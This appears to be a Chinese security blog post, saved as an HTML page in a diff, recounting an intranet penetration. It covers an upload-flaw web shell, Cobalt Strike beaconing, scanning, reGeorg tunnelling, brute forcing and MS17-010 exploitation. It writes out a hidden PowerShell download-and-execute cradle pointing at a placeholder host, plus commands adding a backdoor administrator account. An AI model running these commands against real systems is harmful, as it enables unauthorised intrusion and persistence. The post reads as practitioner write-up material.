@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bywalks">
+
+
+
+    <meta name="description" content="Bywalks个人博客(www.bywalks.com)关注网络安全、信息安全、网站建设、IT行业、网络安全文章、黑客技术、网络安全技术、网络安全知识、互联网安全知识、原创网络安全博客">
+
+
+    <meta name="keywords" content="Bywalks个人博客,关注网络安全,信息安全,网站建设,安全博客,web安全,网站漏洞,网络安全,网络安全技术,网络安全知识,网络安全教程">
+
+
+<title>记一次二层内网渗透 | Bywalks&#39;s Blog - Bywalks个人博客|网络安全爱好者</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bywalks&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bywalks&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">记一次二层内网渗透</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bywalks</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 14, 2020&nbsp;&nbsp;0:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><span style="color: #008000;">前言</span></h2><p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">很久没有写点东西了，这次分享个二层内网的渗透过程，该内网约150台设备，工作组环境。</span></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><span style="color: #008000;">目录</span></h2><p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">0x00外部打点<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">0x01边界突破<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">0x02内网渗透-信息收集<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">0x03内网渗透-拿下资产</span></span></span></span></p>
+<h2 id="0x00外部打点"><a href="#0x00外部打点" class="headerlink" title="0x00外部打点"></a><span style="color: #008000;">0x00外部打点</span></h2><p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">入口点起源于弱口令+上传漏洞<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">当拿到上传漏洞之后，常规渗透途径 小马 -&gt; 大马 -&gt; 提权，条件允许的话个人更喜好大马，故直接上传了大马。<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.jpg"></span></p>
+<h2 id="0x01边界突破"><a href="#0x01边界突破" class="headerlink" title="0x01边界突破"></a><span style="color: #008000;">0x01边界突破</span></h2><p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">有了大马后，首先要做的为信息收集，信息收集大家都知道，渗透测试的关键都在于信息收集。</span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">首先查看权限，为Administrator，其实也不用看，该网站为Tomcat，JSP网站，渗透多了基本知道网站权限为Administrator；<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">其次查看网卡，发现为双网卡服务器，故可把该台主机当作跳板机；<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">查看任务进程，查看任务进程的目的为判断服务器上是否存在杀毒软件，来进行下一步的渗透步骤，该台服务器由下图可以看出，无杀毒软件；<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">查看网络连接，判断服务器开放端口以及相应服务。<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">信息只做浅谈，相应要做的信息收集肯定不止如上那些，收集了如上信息后，由于服务器无杀毒软件，故可直接CS上线，这里采用Powershell上线方式，<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">命令为：</span></span></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://xxx/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">可直接上线；<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.jpg"></span></p>
+<h2 id="0x02内网渗透-信息收集"><a href="#0x02内网渗透-信息收集" class="headerlink" title="0x02内网渗透-信息收集"></a><span style="color: #008000;">0x02内网渗透-信息收集</span></h2><p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">由之前的信息收集可得，已拿下的A主机为双网卡，故可做跳板机，那么可以通过它，扩大这次渗透的战果。</span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">首先，收集内网存活主机，这里采用了K8的CS脚本Ladon，可收集内网存活主机，Target输入192.168.0.1&#x2F;16可扫描B段；<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">存活主机扫描完毕，149台主机内网存活，扫描了主机之后，下一步就是扫端口，用的为CS自带的端口扫描模块，Ports输入自定义端口</span></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21-23,110,139,143,389,512-514,873,1080,1352,1433,1521,2049,2181,3306,3389,4848,5000,5432,5900,6379,7001,80-90,443,8000-9000,9090,9200,9300,11211,27017</span><br></pre></td></tr></table></figure>
+
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">CS自带的端口扫描模块截图：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">对扫描结果进行筛选，这里筛选结果如下：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.jpg"></span></p>
+<h2 id="0x03内网渗透-拿下资产"><a href="#0x03内网渗透-拿下资产" class="headerlink" title="0x03内网渗透-拿下资产"></a><span style="color: #008000;">0x03内网渗透-拿下资产</span></h2><p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">在内网渗透之前，需要说下代理隧道，在这篇文章用得到的隧道为两种，分别为：</span></p>
+<ul>
+<li><span style="font-family: 微软雅黑, 'Microsoft YaHei';">基于Windows平台：reGeorg+Proxifier</span></li>
+<li><span style="font-family: 微软雅黑, 'Microsoft YaHei';">基于Kali平台：reGeorg+Proxychains</span></li>
+</ul>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';"><strong>基于Windows平台：reGeorg+Proxifier</strong><br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">reGeory为设置代理，命令如下：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.jpg"></span></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">Proxifier为让本地流量过代理，需设置监听本地，且放过Python（即让Python流量不过代理），配置如下：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';"><strong>基于Kali平台：reGeorg+Proxychains</strong><br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">跟Windows平台相同的为都用reGeorg做代理，因为reGeorg基于Python，Python在Windows上和Linux上都可安装运行，与Windows平台不同的是，Kali平台导入代理流量的工具是Proxychains，首先需在Proxychains.conf做配置，再在使用工具前加proxychains即可。</span></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">Proxychains配置如下，这里设置的为本地1080端口走代理：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">MSF走代理命令为：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">有人可能会问，CS已经上线，为什么不用CS代理呢，MSF干嘛不用MSF代理呢？<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">答：CS与MSF毕竟为渗透工具，代理模块用起来可以用，但都有各自的缺点，MSF不稳定，CS则速度慢，所以还是设置个其他代理渗透更顺手，这里reGeorg也可换成其他代理。</span></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">说了代理，之后就要聊聊如何进行内网渗透了，由内网信息收集，我们可获得大量内网主机端口信息，对这些信息进行分析，可分为如下三种类型进行渗透：</span></p>
+<ul>
+<li><span style="font-family: 微软雅黑, 'Microsoft YaHei';">Web应用（80、443、8080端口等）；</span></li>
+<li><span style="font-family: 微软雅黑, 'Microsoft YaHei';">数据库、主机应用（1433的MSSQL、3306的MYSQL、Windows的RDP、Linux的SSH等）；</span></li>
+<li><span style="font-family: 微软雅黑, 'Microsoft YaHei';">常规内网漏洞（MS17_010、0708等）。</span></li>
+</ul>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';"><strong>Web应用</strong><br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">内网常用，SQL注入、命令执行（shiro，struct2等）、弱口令等。<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">拿下的Web应用部分截图如下：<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">某后台管理系统：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.jpg"></span></span></span></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">某存储管理系统：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">某设备管理系统：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';"><strong>数据库、主机应用</strong><br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">主要问题为弱口令，可通过超级弱口令检测工具、Hscan、Hydra等进行弱口令检测工具进行爆破。<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">Tips：爆破的主要诀窍在于字典。</span></span></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">超级弱口令检测工具如下：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">Hscan如下：<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';"><strong>常规内网漏洞</strong><br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">之前的代理已经说了Proxychains msfconsole，该命令即为让MSF流量过代理，即在内网环境中。那么在内网环境中可使用MSF的ms170_10、0708等模块去进行相应渗透，msf为内网渗透神器，其内置大量渗透攻击模块<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">使用方式为 ：<br><span style="font-family: 微软雅黑, 'Microsoft YaHei';">查询模块（Search） -&gt; 选择模块（use） -&gt; 查看使用方法（show options） -&gt; 配置参数（set） -&gt; 运行（run）；<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.jpg"></span></span></span></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">在这就通过ms17_010打下了内网网站主服务器，多网站备份以及上万条资料都在其中。下面说下ms17_010打下该服务器的过程。</span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">首先，刚才筛选出一份445端口存在的存活主机表，然后对这份存活主机表进行ms17_010扫描，发现某服务器存在ms17_010，发现存在后，尝试上线，可通过CS监听，MSF派生CS上线或者直接CS上线，发现无法上线，故用ms17_010command模块查看系统任务，估计存在杀毒软件，tasklist命令执行后，发现的确如此，<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">ZhuDongFangYu，很熟悉的程序，说明该台服务器存在360，那么未免杀的木马则无法在该台服务器中运行，这里通过添加管理员账号+远程rdp连接的方式绕过该防护</span></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set command net user administrator1 administrator1 /add</span><br><span class="line">set command net localgroup administrators administrator1 /add</span><br></pre></td></tr></table></figure>
+
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">执行后net user查看，发现administrator1已添加，那么接下来可直接连接3389端口的rdp了，已拿下该服务器，经过后期登录查看，发现多网站备份以及上万条资料都在其中。<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/22.jpg"></span></p>
+<p><span style="font-family: 微软雅黑, 'Microsoft YaHei';">写文章时发现有用户登录，不做登陆操作演示了。<br><img src="/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/23.jpg"></span></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bywalks</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">http://example.com/2020/12/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"># 红蓝对抗</a>
+                    
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 内网渗透</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12/31/Cobalt%20Strike%E5%8A%A0%E5%9B%BA+%E5%85%8D%E6%9D%80/">Cobalt Strike加固+免杀</a>
+            
+            
+            <a class="next" rel="next" href="/2020/08/06/%E7%BD%91%E7%AB%99%E8%BF%81%E7%A7%BB%E3%80%90%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA-vps%E3%80%91/">网站迁移【虚拟主机 -> VPS】</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bywalks | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
